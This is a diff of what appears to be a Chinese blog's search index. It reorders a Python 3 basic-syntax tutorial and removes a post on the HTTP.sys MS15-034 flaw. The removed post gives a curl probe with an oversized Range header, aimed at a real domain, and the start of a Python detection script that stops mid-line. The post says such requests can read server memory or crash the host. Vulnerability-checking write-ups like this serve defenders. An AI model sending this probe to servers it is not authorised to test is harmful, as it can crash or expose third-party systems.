@@ -66,7 +66,8 @@
 </tbody></table>
 ]]></content>
       <categories>
-        <category>漏洞利用、未授权访问漏洞</category>
+        <category>漏洞利用</category>
+        <category>未授权访问漏洞</category>
       </categories>
       <tags>
         <tag>未授权访问</tag>
@@ -389,6 +390,113 @@
       </tags>
   </entry>
   <entry>
+    <title>python3基础语法</title>
+    <url>//08be3fd6d7b6.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer" />
+
+<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，python3源码文件以<code>UTF-8</code>作为编码，所有字符串都是<code>Unicode</code>字符串。也可以手动为源码文件指定不同的编码：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>也就是变量名，虽然在python没有明确限制，但是有一套默认的命名规则</p>
+<ul>
+<li>第一个字符必须是字母或下划线_</li>
+<li>标识符的其他部分由字母，数字和下划线组成</li>
+<li>标识符对大小写敏感</li>
+</ul>
+<h2 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h2><p>保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line">test = keyword.kwlist</span><br><span class="line"><span class="built_in">print</span>(test)</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>当我们想给一些代码添加说明，又不参与代码运行的时候，就要通过添加注释的方法</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)	<span class="comment"># 输出hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多行注释</span></span><br><span class="line"><span class="comment"># 可以使用&#x27;&#x27;&#x27;或者&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>python中以缩进来表示代码块</p>
+<p>缩进的空格是可变的，但是同一个代码块的语句必须包含相同的缩进空格数</p>
+<p>这里没有明确限制，不过默认缩进为一个tab，也就是四个空格</p>
+<p>如果同一个代码块的缩进空格数不一样，那么程序就会报错</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>python中通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠<code>\</code>来实现多行语句。例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = test_one + \</span><br><span class="line">       test_two + \</span><br><span class="line">       test_three</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>[]</code>, <code>&#123;&#125;</code>, 或 <code>()</code> 中的多行语句，不需要使用反斜杠<code>\</code>，例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;test_one&#x27;</span>,<span class="string">&#x27;test_two&#x27;</span>,<span class="string">&#x27;test_three&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;test_four&#x27;</span>,<span class="string">&#x27;test_five&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><p>Python3中有六个标准的数据类型：</p>
+<ul>
+<li>Number（数字）</li>
+<li>String（字符串）</li>
+<li>List（列表）</li>
+<li>Tuple（元组）</li>
+<li>Set（集合）</li>
+<li>Dictionary（字典）</li>
+</ul>
+<p>Python3的六个标准数据库类型中：</p>
+<ul>
+<li>不可变数据：Number（数字）、String（字符串）、Tuple（元组）</li>
+<li>可变数据：List（列表）、Dictionary（字典）、Set（集合）</li>
+</ul>
+<h2 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h2><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p>
+<ul>
+<li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li>
+<li><strong>bool</strong> (布尔), 如 True。</li>
+<li><strong>float</strong> (浮点数), 如 1.23、3E-2</li>
+<li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li>
+</ul>
+<h2 id="二进制类型"><a href="#二进制类型" class="headerlink" title="二进制类型"></a>二进制类型</h2><p>Python中二进制有三种类型</p>
+<ul>
+<li><strong>bytes()</strong></li>
+<li><strong>bytearray()</strong></li>
+<li><strong>memoryview()</strong></li>
+</ul>
+<h2 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h2><ul>
+<li>python中单引号和双引号使用完全相同。</li>
+<li>使用三引号(‘’’或”””)可以指定一个多行字符串。</li>
+<li>转义符 <code>\</code></li>
+<li>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。。 如 <code>r&quot;this is a line with \n&quot;</code> 则<code>\n</code>会显示，并不是换行。</li>
+<li>按字面意义级联字符串，如”this “ “is “ “string”会被自动转换为this is string。</li>
+<li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li>
+<li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li>
+<li>Python中的字符串不能改变。</li>
+<li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li>
+<li>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;字符串&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落，</span></span><br><span class="line"><span class="string">可以由多行组成&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h2><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块。</p>
+<p>将整个模块(somemodule)导入，格式为： <strong>import somemodule</strong></p>
+<p>从某个模块中导入某个函数,格式为： <strong>from somemodule import somefunction</strong></p>
+<p>从某个模块中导入多个函数,格式为： <strong>from somemodule import firstfunc, secondfunc, thirdfunc</strong></p>
+<p>将某个模块中的全部函数导入，格式为： <strong>from somemodule import *</strong></p>
+<p>两者之间作用域不一样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 基础模块 a.py</span><br><span class="line">data&#x3D;[1,2,3]</span><br><span class="line"> </span><br><span class="line">def run():</span><br><span class="line">	print(data)</span><br></pre></td></tr></table></figure>
+
+<p>**import…**导入模块+</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> a</span><br><span class="line"><span class="comment">#由于是直接import a 所以都是从源模块a里面拿出来的，所以这里的改变都会影响源模块a</span></span><br><span class="line"><span class="comment">#可以理解为有着作用域 a.的限制</span></span><br><span class="line">a.data[<span class="number">0</span>]=<span class="number">5</span> </span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出[5,2,3]</span></span><br><span class="line">a.run() <span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">a.data=<span class="number">100</span> <span class="comment">#因为这里影响的是a里面的data</span></span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出100</span></span><br><span class="line">a.run() <span class="comment">#输出100</span></span><br></pre></td></tr></table></figure>
+
+<p>**from…import…**导入模块</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> run,data</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data[<span class="number">0</span>]=<span class="number">5</span> <span class="comment">#类似赋值，b里面的data和a里面的data指向同一个对象，这么做对两者都有影响</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出[5,2,3] </span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">data=<span class="number">100</span> <span class="comment">#由于直接改变了data的指向，所以不会影响源模块a</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出100</span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+      </categories>
+      <tags>
+        <tag>Python3基础知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3字符串</title>
     <url>//958713fc29fc.html</url>
     <content><![CDATA[<meta name="referrer" content="no-referrer" />
@@ -637,113 +745,6 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(x.方法名(条件))</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">capitalize()	把首字符转换为大写。</span><br><span class="line">casefold()		把字符串转换为小写。</span><br><span class="line">center()		返回居中的字符串。</span><br><span class="line">count()			返回指定值在字符串中出现的次数。</span><br><span class="line">encode()		返回字符串的编码版本。</span><br><span class="line">endswith()		如果字符串以指定值结尾，则返回 true。</span><br><span class="line">expandtabs()	设置字符串的 tab 尺寸。</span><br><span class="line">find()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line"><span class="built_in">format</span>()		格式化字符串中的指定值。</span><br><span class="line">format_map()	格式化字符串中的指定值。</span><br><span class="line">index()			在字符串中搜索指定的值并返回它被找到的位置。</span><br><span class="line">isalnum()		如果字符串中的所有字符都是字母数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isalpha()		如果字符串中的所有字符都在字母表中，则返回 <span class="literal">True</span>。</span><br><span class="line">isdecimal()		如果字符串中的所有字符都是小数，则返回 <span class="literal">True</span>。</span><br><span class="line">isdigit()		如果字符串中的所有字符都是数字，则返回 <span class="literal">True</span>。</span><br><span class="line">isidentifier()	如果字符串是标识符，则返回 <span class="literal">True</span>。</span><br><span class="line">islower()		如果字符串中的所有字符都是小写，则返回 <span class="literal">True</span>。</span><br><span class="line">isnumeric()		如果字符串中的所有字符都是数，则返回 <span class="literal">True</span>。</span><br><span class="line">isprintable()	如果字符串中的所有字符都是可打印的，则返回 <span class="literal">True</span>。</span><br><span class="line">isspace()		如果字符串中的所有字符都是空白字符，则返回 <span class="literal">True</span>。</span><br><span class="line">istitle()		如果字符串遵循标题规则，则返回 <span class="literal">True</span>。</span><br><span class="line">isupper()		如果字符串中的所有字符都是大写，则返回 <span class="literal">True</span>。</span><br><span class="line">join()			把可迭代对象的元素连接到字符串的末尾。</span><br><span class="line">ljust()			返回字符串的左对齐版本。</span><br><span class="line">lower()			把字符串转换为小写。</span><br><span class="line">lstrip()		返回字符串的左修剪版本。</span><br><span class="line">maketrans()		返回在转换中使用的转换表。</span><br><span class="line">partition()		返回元组，其中的字符串被分为三部分。</span><br><span class="line">replace()		返回字符串，其中指定的值被替换为指定的值。</span><br><span class="line">rfind()			在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rindex()		在字符串中搜索指定的值，并返回它被找到的最后位置。</span><br><span class="line">rjust()			返回字符串的右对齐版本。</span><br><span class="line">rpartition()	返回元组，其中字符串分为三部分。</span><br><span class="line">rsplit()		在指定的分隔符处拆分字符串，并返回列表。</span><br><span class="line">rstrip()		返回字符串的右边修剪版本。</span><br><span class="line">split()			在指定的分隔符处拆分字符串，并返回列表。</span><br><span class="line">splitlines()	在换行符处拆分字符串并返回列表。</span><br><span class="line">startswith()	如果以指定值开头的字符串，则返回 true。</span><br><span class="line">strip()			返回字符串的剪裁版本。</span><br><span class="line">swapcase()		切换大小写，小写成为大写，反之亦然。</span><br><span class="line">title()			把每个单词的首字符转换为大写。</span><br><span class="line">translate()		返回被转换的字符串。</span><br><span class="line">upper()			把字符串转换为大写。</span><br><span class="line">zfill()			在字符串的开头填充指定数量的 <span class="number">0</span> 值。</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>Python3</category>
-      </categories>
-      <tags>
-        <tag>Python3基础知识</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python3基础语法</title>
-    <url>//08be3fd6d7b6.html</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer" />
-
-<h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><p>默认情况下，python3源码文件以<code>UTF-8</code>作为编码，所有字符串都是<code>Unicode</code>字符串。也可以手动为源码文件指定不同的编码：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>也就是变量名，虽然在python没有明确限制，但是有一套默认的命名规则</p>
-<ul>
-<li>第一个字符必须是字母或下划线_</li>
-<li>标识符的其他部分由字母，数字和下划线组成</li>
-<li>标识符对大小写敏感</li>
-</ul>
-<h2 id="python保留字"><a href="#python保留字" class="headerlink" title="python保留字"></a>python保留字</h2><p>保留字即关键字，我们不能把它们用作任何标识符名称。Python 的标准库提供了一个 keyword 模块，可以输出当前版本的所有关键字：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keyword</span><br><span class="line">test = keyword.kwlist</span><br><span class="line"><span class="built_in">print</span>(test)</span><br><span class="line"></span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>当我们想给一些代码添加说明，又不参与代码运行的时候，就要通过添加注释的方法</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)	<span class="comment"># 输出hello</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 多行注释</span></span><br><span class="line"><span class="comment"># 可以使用&#x27;&#x27;&#x27;或者&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">我们是一段注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h2><p>python中以缩进来表示代码块</p>
-<p>缩进的空格是可变的，但是同一个代码块的语句必须包含相同的缩进空格数</p>
-<p>这里没有明确限制，不过默认缩进为一个tab，也就是四个空格</p>
-<p>如果同一个代码块的缩进空格数不一样，那么程序就会报错</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;False&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="多行语句"><a href="#多行语句" class="headerlink" title="多行语句"></a>多行语句</h2><p>python中通常是一行写完一条语句，但如果语句很长，我们可以使用反斜杠<code>\</code>来实现多行语句。例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = test_one + \</span><br><span class="line">       test_two + \</span><br><span class="line">       test_three</span><br></pre></td></tr></table></figure>
-
-<p>在 <code>[]</code>, <code>&#123;&#125;</code>, 或 <code>()</code> 中的多行语句，不需要使用反斜杠<code>\</code>，例如：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test = [<span class="string">&#x27;test_one&#x27;</span>,<span class="string">&#x27;test_two&#x27;</span>,<span class="string">&#x27;test_three&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;test_four&#x27;</span>,<span class="string">&#x27;test_five&#x27;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="标准数据类型"><a href="#标准数据类型" class="headerlink" title="标准数据类型"></a>标准数据类型</h2><p>Python3中有六个标准的数据类型：</p>
-<ul>
-<li>Number（数字）</li>
-<li>String（字符串）</li>
-<li>List（列表）</li>
-<li>Tuple（元组）</li>
-<li>Set（集合）</li>
-<li>Dictionary（字典）</li>
-</ul>
-<p>Python3的六个标准数据库类型中：</p>
-<ul>
-<li>不可变数据：Number（数字）、String（字符串）、Tuple（元组）</li>
-<li>可变数据：List（列表）、Dictionary（字典）、Set（集合）</li>
-</ul>
-<h2 id="数字-Number-类型"><a href="#数字-Number-类型" class="headerlink" title="数字(Number)类型"></a>数字(Number)类型</h2><p>python中数字有四种类型：整数、布尔型、浮点数和复数。</p>
-<ul>
-<li><strong>int</strong> (整数), 如 1, 只有一种整数类型 int，表示为长整型，没有 python2 中的 Long。</li>
-<li><strong>bool</strong> (布尔), 如 True。</li>
-<li><strong>float</strong> (浮点数), 如 1.23、3E-2</li>
-<li><strong>complex</strong> (复数), 如 1 + 2j、 1.1 + 2.2j</li>
-</ul>
-<h2 id="二进制类型"><a href="#二进制类型" class="headerlink" title="二进制类型"></a>二进制类型</h2><p>Python中二进制有三种类型</p>
-<ul>
-<li><strong>bytes()</strong></li>
-<li><strong>bytearray()</strong></li>
-<li><strong>memoryview()</strong></li>
-</ul>
-<h2 id="字符串-String"><a href="#字符串-String" class="headerlink" title="字符串(String)"></a>字符串(String)</h2><ul>
-<li>python中单引号和双引号使用完全相同。</li>
-<li>使用三引号(‘’’或”””)可以指定一个多行字符串。</li>
-<li>转义符 <code>\</code></li>
-<li>反斜杠可以用来转义，使用r可以让反斜杠不发生转义。。 如 <code>r&quot;this is a line with \n&quot;</code> 则<code>\n</code>会显示，并不是换行。</li>
-<li>按字面意义级联字符串，如”this “ “is “ “string”会被自动转换为this is string。</li>
-<li>字符串可以用 + 运算符连接在一起，用 * 运算符重复。</li>
-<li>Python 中的字符串有两种索引方式，从左往右以 0 开始，从右往左以 -1 开始。</li>
-<li>Python中的字符串不能改变。</li>
-<li>Python 没有单独的字符类型，一个字符就是长度为 1 的字符串。</li>
-<li>字符串的截取的语法格式如下：<strong>变量[头下标:尾下标:步长]</strong></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">word = <span class="string">&#x27;字符串&#x27;</span></span><br><span class="line">sentence = <span class="string">&quot;这是一个句子。&quot;</span></span><br><span class="line">paragraph = <span class="string">&quot;&quot;&quot;这是一个段落，</span></span><br><span class="line"><span class="string">可以由多行组成&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="import-与-from…import"><a href="#import-与-from…import" class="headerlink" title="import 与 from…import"></a>import 与 from…import</h2><p>在 python 用 <strong>import</strong> 或者 <strong>from…import</strong> 来导入相应的模块。</p>
-<p>将整个模块(somemodule)导入，格式为： <strong>import somemodule</strong></p>
-<p>从某个模块中导入某个函数,格式为： <strong>from somemodule import somefunction</strong></p>
-<p>从某个模块中导入多个函数,格式为： <strong>from somemodule import firstfunc, secondfunc, thirdfunc</strong></p>
-<p>将某个模块中的全部函数导入，格式为： <strong>from somemodule import *</strong></p>
-<p>两者之间作用域不一样</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 基础模块 a.py</span><br><span class="line">data&#x3D;[1,2,3]</span><br><span class="line"> </span><br><span class="line">def run():</span><br><span class="line">	print(data)</span><br></pre></td></tr></table></figure>
-
-<p>**import…**导入模块+</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> a</span><br><span class="line"><span class="comment">#由于是直接import a 所以都是从源模块a里面拿出来的，所以这里的改变都会影响源模块a</span></span><br><span class="line"><span class="comment">#可以理解为有着作用域 a.的限制</span></span><br><span class="line">a.data[<span class="number">0</span>]=<span class="number">5</span> </span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出[5,2,3]</span></span><br><span class="line">a.run() <span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">a.data=<span class="number">100</span> <span class="comment">#因为这里影响的是a里面的data</span></span><br><span class="line"><span class="built_in">print</span>(a.data) <span class="comment">#输出100</span></span><br><span class="line">a.run() <span class="comment">#输出100</span></span><br></pre></td></tr></table></figure>
-
-<p>**from…import…**导入模块</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#test1.py</span></span><br><span class="line"><span class="keyword">from</span> a <span class="keyword">import</span> run,data</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">data[<span class="number">0</span>]=<span class="number">5</span> <span class="comment">#类似赋值，b里面的data和a里面的data指向同一个对象，这么做对两者都有影响</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出[5,2,3] </span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br><span class="line"> </span><br><span class="line">data=<span class="number">100</span> <span class="comment">#由于直接改变了data的指向，所以不会影响源模块a</span></span><br><span class="line"><span class="built_in">print</span>(data) <span class="comment">#输出100</span></span><br><span class="line">run()<span class="comment">#输出[5,2,3]</span></span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1299,43 +1300,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HTTP.SYS远程执行代码漏洞(MS15-034)</title>
-    <url>//67bda6fdaf83.html</url>
-    <content><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞</p>
-<p>远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞</p>
-<p>攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>任何安装了微软IIS 6.0以上的</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Win Server 2008 R2</span><br><span class="line">Win Server 2012</span><br><span class="line">Win Server 2012 R2</span><br><span class="line">Win 7</span><br><span class="line">Win 8</span><br><span class="line">Win 8.1</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">使用curl工具检测</button></li><li class="tab"><button type="button" data-href="#-2">使用python3检测域名</button></li><li class="tab"><button type="button" data-href="#-3">使用python3检测IP</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -H &quot;Range: bytes&#x3D;0-18446744073709551615&quot; http:&#x2F;&#x2F;www.baidu.com</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器存在HTTP.SYS远程代码执行漏洞，那么响应状态应该有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure>
-
-<p>如果服务器打上了补丁，那么响应状态应该是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP Error 400. The request has an invalid header name.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;;jastra&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bg_colors</span>:</span></span><br><span class="line">    VULN = <span class="string">&#x27;;33[92m&#x27;</span>;</span><br><span class="line">    NONVULN= <span class="string">&#x27;;33[95m&#x27;</span>;</span><br><span class="line">    EXPLOIT = <span class="string">&#x27;;33[91m&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">identify_iis</span>(<span class="params">domain</span>):</span></span><br><span class="line">    	req = requests.get(<span class="built_in">str</span>(domain))</span><br><span class="line">        remote_server = req.headers[<span class="string">&#x27;server&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Microsoft-IIS&#x27;</span> <span class="keyword">in</span> remote_server:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务是&#x27;</span> + remote_server)</span><br><span class="line">            ms15_034_test(<span class="built_in">str</span>(domain))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器不是IIS\n可能是: &#x27;</span> + remote_server)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ms15_034_test</span>(<span class="params">domain</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;启动vuln检查!&#x27;</span>)</span><br><span class="line">        headers = &#123;<span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;stuff&#x27;</span>,<span 